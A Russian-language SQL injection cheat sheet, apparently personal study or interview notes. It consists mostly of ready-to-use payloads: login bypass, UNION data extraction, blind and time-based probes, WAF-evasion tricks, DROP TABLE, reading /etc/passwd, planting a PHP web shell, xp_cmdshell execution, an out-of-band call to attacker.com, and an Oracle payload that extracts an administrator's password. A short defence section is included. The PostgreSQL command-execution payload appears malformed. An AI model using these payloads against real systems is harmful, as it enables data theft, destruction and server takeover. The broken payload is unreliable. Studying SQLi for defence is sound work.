# SQL Injection 

##  **Краткое определение **

**SQL Injection (SQLi)** — это уязвимость, которая позволяет злоумышленнику внедрить произвольный SQL-код в запрос к базе данных. Возникает из-за того, что пользовательский ввод подставляется в запрос без экранирования или параметризации. Последствия: кража, модификация или удаление данных, выполнение команд на сервере, полная компрометация системы.


## 🎯 **1. Типы SQLi (по способу получения данных)**

| Тип | Суть | Пример |
| :--- | :--- | :--- |
| **Error-based** | Ошибки БД выводят информацию | `' AND 1=CONVERT(int, @@version) --` |
| **Union-based** | Объединение запросов для вывода данных | `' UNION SELECT username, password FROM users --` |
| **Boolean Blind** | Проверка условия (TRUE/FALSE) | `' AND 1=1 --` / `' AND 1=2 --` |
| **Time-based** | Задержка ответа (если условие TRUE) | `' AND SLEEP(5) --` |
| **Out-of-band** | Данные уходят по внешнему каналу (DNS) | `' AND LOAD_FILE('\\\\attacker.com\\share') --` |


## 🔥 **2. Базовые Payloads (что использовать)**

| Payload | Что делает |
| :--- | :--- |
| `' OR '1'='1` | Обход логина (всегда TRUE) |
| `' UNION SELECT null, user, pass FROM users --` | Извлечение данных |
| `' AND SLEEP(5) --` | Проверка Time-based Blind |
| `' AND 1=1 --` / `' AND 1=2 --` | Проверка Boolean Blind |
| `'; DROP TABLE users --` | Удаление таблицы |


## 🛡️ **3. Обход WAF / фильтров**

| Техника | Пример |
| :--- | :--- |
| Комментарии | `'/**/OR/**/1=1 --` |
| Двойная кодировка | `%2527` вместо `'` |
| Регистр | `SeLeCt` вместо `SELECT` |
| Конкатенация | `' || '1'='1` |
| Null byte | `%00' OR 1=1 --` |
| Табы / переносы | `%09`, `%0a` |


## 📂 **4. Сбор информации о БД**

| Запрос | Что даёт |
| :--- | :--- |
| `SELECT version()` | Версия БД |
| `SELECT database()` | Имя БД |
| `SELECT user()` | Текущий пользователь |
| `SELECT table_name FROM information_schema.tables` | Список таблиц |
| `SELECT column_name FROM information_schema.columns WHERE table_name='users'` | Столбцы таблицы |


## 🚀 **5. Эксплуатация (чтение/запись файлов, RCE)**

| Действие | Payload |
| :--- | :--- |
| **Чтение файла (MySQL)** | `' UNION SELECT LOAD_FILE('/etc/passwd') --` |
| **Запись шелла (MySQL)** | `' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --` |
| **Выполнение команд (MSSQL)** | `'; EXEC xp_cmdshell('whoami'); --` |
| **Выполнение команд (PostgreSQL)** | `'; CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$ '/bin/sh -c ' || $1 || '' $$ LANGUAGE C; SELECT exec('id'); --` |


## 🔐 **6. Защита**

| Метод | Что делать |
| :--- | :--- |
| **Параметризованные запросы** | Использовать `PreparedStatement` (Java), `PDO` (PHP), `cursor.execute()` (Python) |
| **Валидация ввода** | Белый список символов, строгая типизация |
| **Минимальные права БД** | У приложения — только необходимые привилегии |
| **Скрывать ошибки БД** | Не показывать детали ошибок пользователю |
| **WAF** | Блокировка подозрительных запросов |
| **ORM** | Использовать готовые ORM-решения (Hibernate, SQLAlchemy, Entity Framework) |



 *«SQLi — одна из самых опасных уязвимостей OWASP Top 10. В своей практике я сталкивался с ней в ERP-системе: запросы строились через самописную ORM без параметризации. Я смог выполнить произвольные запросы к БД, получить данные пользователей и повысить привилегии до администратора. Исправляли через внедрение параметризованных запросов и изоляцию API-слоя».* 🚀


 ### CUSTOM PAYLOADS

 # BLIND SQL WITH CONDITIONAL RESPONSE

 # ORACLE:
 param=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'